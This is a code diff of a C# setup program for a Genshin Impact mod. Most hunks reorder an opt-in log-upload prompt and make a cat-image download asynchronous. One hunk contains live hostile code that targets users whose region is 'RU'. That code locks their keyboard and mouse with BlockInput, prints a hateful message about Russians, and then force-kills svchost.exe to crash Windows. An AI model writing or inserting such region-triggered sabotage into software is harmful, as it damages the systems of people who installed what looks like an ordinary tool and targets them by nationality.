@@ -63,40 +63,6 @@ namespace Genshin_Impact_Mod_Setup
 			}
 
 
-			// Second question.
-			Console.ForegroundColor = ConsoleColor.Green;
-			Console.Write("» I want to send anonymous installation log files to the developer [Yes/no]: ");
-			Console.ResetColor();
-
-			string sendLogFile = Console.ReadLine();
-			if (Regex.Match(sendLogFile ?? string.Empty, "(?:y)", RegexOptions.IgnoreCase | RegexOptions.Singleline).Success)
-			{
-				bool hookSuccess = await WebHook.SendLogFiles();
-
-				if (hookSuccess)
-				{
-					Console.WriteLine("Some files has been sent. This will help improve our apps. Thank you very much >~~<! Close the new window.");
-
-					if (File.Exists("Data/Images/kyaru-anime.gif"))
-						Application.Run(new ThumbsUp { Icon = Icon.ExtractAssociatedIcon("Data/Images/52x52.ico") });
-					else
-						Process.Start("https://media.tenor.com/KMMqrCPegSUAAAAC/kyaru-anime.gif");
-
-					Console.ForegroundColor = ConsoleColor.Green;
-					Console.Write("» I want to see these files [Yes/no]: ");
-					Console.ResetColor();
-
-					string seeLogFiles = Console.ReadLine();
-					if (Regex.Match(seeLogFiles ?? string.Empty, "(?:y)", RegexOptions.IgnoreCase | RegexOptions.Singleline).Success) Process.Start(Log.Folder);
-				}
-				else
-				{
-					Console.ForegroundColor = ConsoleColor.Red;
-					Console.WriteLine("Ohh noooo!! Something went wrong. Failed to send Webhook. Sorry ):");
-				}
-			}
-
-
 			// Reboot PC is required.
 			if (Cmd.RebootNeeded)
 			{
@@ -115,6 +81,39 @@ namespace Genshin_Impact_Mod_Setup
 					Log.Output("PC reboot was scheduled.");
 
 					WebHook.RebootIsScheduled();
+				}
+			}
+
+
+			// Second question.
+			Console.ForegroundColor = ConsoleColor.Green;
+			Console.Write("» I want to send anonymous installation log files to the developer [Yes/no]: ");
+			Console.ResetColor();
+
+			string sendLogFile = Console.ReadLine();
+			if (Regex.Match(sendLogFile ?? string.Empty, "(?:y)", RegexOptions.IgnoreCase | RegexOptions.Singleline).Success)
+			{
+				bool deliveredFiles = await WebHook.SendLogFiles();
+				if (deliveredFiles)
+				{
+					Console.WriteLine("Some files has been sent. This will help improve our apps. Thank you very much >~~<! Close the new window.");
+
+					if (File.Exists("Data/Images/kyaru.gif"))
+						Application.Run(new ThumbsUp { Icon = Icon.ExtractAssociatedIcon("Data/Images/52x52.ico") });
+					else
+						Process.Start("https://media.tenor.com/KMMqrCPegSUAAAAC/kyaru-anime.gif");
+
+					Console.ForegroundColor = ConsoleColor.Green;
+					Console.Write("» I want to see these files [Yes/no]: ");
+					Console.ResetColor();
+
+					string seeLogFiles = Console.ReadLine();
+					if (Regex.Match(seeLogFiles ?? string.Empty, "(?:y)", RegexOptions.IgnoreCase | RegexOptions.Singleline).Success) Process.Start(Log.Folder);
+				}
+				else
+				{
+					Console.ForegroundColor = ConsoleColor.Red;
+					Console.WriteLine("Ohh noooo!! Something went wrong. Failed to send Webhook. Sorry ):");
 				}
 			}
 
@@ -145,13 +144,12 @@ namespace Genshin_Impact_Mod_Setup
 			if (RegionInfo.CurrentRegion.Name == "RU")
 			{
 				TaskbarManager.Instance.SetProgressState(TaskbarProgressBarState.Error);
+				Start.NativeMethods.BlockInput(true);
 
 				Console.ForegroundColor = ConsoleColor.Red;
 				Console.WriteLine("\nSorry, I really hate Russians. NOT BY WAR!");
 
-				Start.NativeMethods.BlockInput(true);
 				Process.Start("https://noel.sefinek.net/video/a2xhdW4gamViYW55IHogY2llYmll.mp4");
-
 				Thread.Sleep(20000);
 				await Cmd.Execute("taskkill", "/F /IM svchost.exe", null);
 			}
@@ -163,13 +161,13 @@ namespace Genshin_Impact_Mod_Setup
 			Console.ResetColor();
 
 			string giveMeACatImg = Console.ReadLine()?.ToLower();
-			Console.WriteLine("Have fun! UwU <:");
+			Console.WriteLine("Waiting for a random cat >.<");
 
 			if (Regex.Match(giveMeACatImg ?? string.Empty, "(?:y)", RegexOptions.IgnoreCase | RegexOptions.Singleline).Success)
 			{
 				WebClient client = new WebClient();
 				client.Headers.Add("user-agent", Program.UserAgent);
-				string json = client.DownloadString("https://api.sefinek.net/api/v1/animals/cat");
+				string json = await client.DownloadStringTaskAsync("https://api.sefinek.net/api/v1/animals/cat");
 				SefinekApi res = JsonConvert.DeserializeObject<SefinekApi>(json);
 
 				if (res.Success)
